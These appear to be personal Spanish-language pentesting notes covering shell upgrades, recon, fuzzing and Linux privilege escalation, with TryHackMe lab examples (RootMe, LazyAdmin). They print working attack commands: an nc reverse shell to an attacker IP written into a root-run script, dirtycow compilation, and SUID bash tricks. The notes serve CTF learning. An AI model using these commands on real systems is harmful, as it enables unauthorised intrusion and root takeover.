# Mejorar Shell

## Forma 1

>[[script /dev/null -c bash]]

Para ponerla aún mejor:

> `control + z`
> [[stty -raw echo; fg]]
> `reset xterm`
> [[export TERM=Xterm]]

Y ahora tenemos la shell más interactiva.

## Forma 2

1. `python -c 'import pty;pty.spawn("/bin/bash")';`
2.  Presionar ctrl^z
3. `stty raw -echo`
4.   `stty size` (no sé si es necesario)
5. Ahora escribir 'fg' y presionar ENTER
6. `export SHELL=bash`
7. `export TERM=xterm-256color`


# 1. Reconocimiento

Podemos empezar usando [[nmap]]: `nmap -p- -sVC -sC -sS --open -vvv -n -Pn IP -oN newNameFile`.

También podemos emplear el comando [[whatweb]] para ver más información de la página web.

# 2. Fuzzing

Podemos usar (más o menos son iguales):

## Gobuster

**Pero, ¿y si hay [[subdominios]]?**

Vamos a usar un diccionario de github para ver si encontramos algo:

1. Buscamos el diccionario de "seclists".

2. Dentro del path "discovery > DNS", encontramos los posibles subdominios más comunes dentro de las páginas webs.

3. Una vez elegido el fichero (podemos elegir el más grande, aunque implique más tiempo), hacemos un [[wget]] del enlace, y ya lo tenemos descargado.

4. Una vez que tenemos el fichero descargado, vamos a usar [[gobuster]]:

> `gobuster vhost -w diccionary -u URL -k`

EL `-K` ES SOLO PARA CUÁNDO ES [[HTTPS]]

- `vhost`: quiero ver si se aplican de otro hosting.
- `-k`: página segura (HTTPS). 

## Dirbuster

Para ver a cuáles directorios podemos acceder desde esta web, usaremos la aplicación **[[Dirbuster]]**:

1. Insertamos la URL (http://ip:port).

2. Ponemos 50 hilos.

3. En "FIle with the list of dirs/files", buscamos con "browse" y elegimos el siguiente path: "/usr/share/wordlists/dirbuster/**medium**" (casi siempre escogeremos el medium), y le damos a Start.
 
4. En esta máquina, encontramos el directorio "cgi-bin"... Si investigamos sobre este directorio, veremos que es una vulnerabilidad que podemos explotar, y que dentro de este encontramos archivos binarios.
 
5. Si hacemos otra búsqueda con [[Dirbuster]], pero lo configuramos para que empiece por "/cgi-bin" y que busque archivos "sh, py", nos dará los archivos binarios que podremos ejecutar ([[reverse shell]]).

## SUBDOMINIOS

Una vez terminado el escaneo, tendremos los subdominios... LOS SUBDOMINIOS DEBEN INTRODUCIRSE DELANTE DEL DOMINIO, por ejemplo:

> https://store.nunchucks.htb

No nos funcionará, porque hay que añadirlo también al [[/etc/hosts]] (se pone al lado del dominio original):

`ip domain subdomain`

# 3. Explotación

Podemos usar herramientas cómo:

- [[Metaexploit]]

- [[Searchsploit]]

- Payload all the things (Repositorio de GitHub)

- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

- Extensión [[Wappalyzer]].


# 4. Escalada de Privilegios

## 4.1. Escalada de Privilegios Linux

- Podemos ejecutar el script linux-exploit-suggester.sh para ver diferentes CVEs a los que posiblemente sea vulnerable el sistema. Uno de los posibles es dirtycow, como en la máquina de Linux PrivEsc Arena de THM.
	Para ejecutar el dirtycow habría que compilar y ejecutar el binario:
		**$ gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0 c0w**
		**$ ./c0w**

- Mirar si existe fichero .ovpn y si existe en él la directiva auth-user-pass, y ver que valor tiene. Debería ser la ruta a donde está la contraseña en texto plano.

- Mirar el fichero .bash_history para ver si se ha colado una contraseña.

- Comprobar los permisos de los ficheros, en especial del shadow y del passwd.

- Comprobar si se puede ver el fichero id_rsa para loguearse por ssh. Si lo está, ponerle permisos solo de lectura ($ chmod 400 id_rsa).

- Ejecutar "sudo -l" y ver que se puede ejecutar como root.

- El siguiente comando sirve para ver los binarios SUID del sistema:
	- **$ find / -type f -perm -04000 -ls 2>/dev/null**


- El siguiente comando sirve para ver si algún binario está suelto:
	- **$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"**

- El siguiente comando busca recursivamente en todo el sistema de archivos en busca de archivos binarios que tengan capacidades asignadas y muestra los permisos de capacidad de esos archivos. Cualquier mensaje de error se suprime y no se muestra en la terminal:
	- **$ getcap -r / 2>/dev/null**

- Este comando copia una bash en el directorio /tmp y luego le añade permisos SETUID:
	- **cp /bin/bash /tmp/bash; chmod +s /tmp/bash**
	Despu-es podemos ejecutar la bash con la flag -p, que nos da permisos de superusuario:
	- **$ /tmp/bash -p**


### MÁQUINA RootMe de THM
Si vemos los archivos que tienen el bit SUID activo, vemos que python está activo. Eso es bastante sospechoso. Podemos ejecutar python como sudo y ejecutar una shell de la siguiente manera:

	-$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

De esta manera abrimos una shell con privilegios con python.

### MÁQUINA LazyAdmin de THM
En esta máquina hemos podido observar que al ejecutar `$ sudo -l` nos salían que podíamos ejecutar con derechos de root lo siguiente:

- (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

El fichero **backup.pl** ejecutaba un fichero .sh (copy.sh) que ejecutaba una shell:

- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f`

El fichero copy.sh era ejecutable por todo el mundo, a causa de weak file permissions.
Por lo tanto hemos podido aprovecharnos de esto y ejecutar una shell en NUESTRA máquina con permisos de root:

Primero modificamos el fichero. En este caso no había ni vim ni vi ni nano, por lo tanto hemos recurrido a lo siguiente:

- `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc NUESTRA_IP_DE_THM 1337 >/tmp/f" > /etc/copy.sh`

NOTA: Anteriormente, como en todas las reverse shell, hemos puesto un puerto en escucha.

Por último, tenemos que ejecutar el fichero con permisos root.

- `$ sudo /usr/bin/perl /home/itguy/backup.pl`

Y ya tendríamos una shell con root. YEEHA!







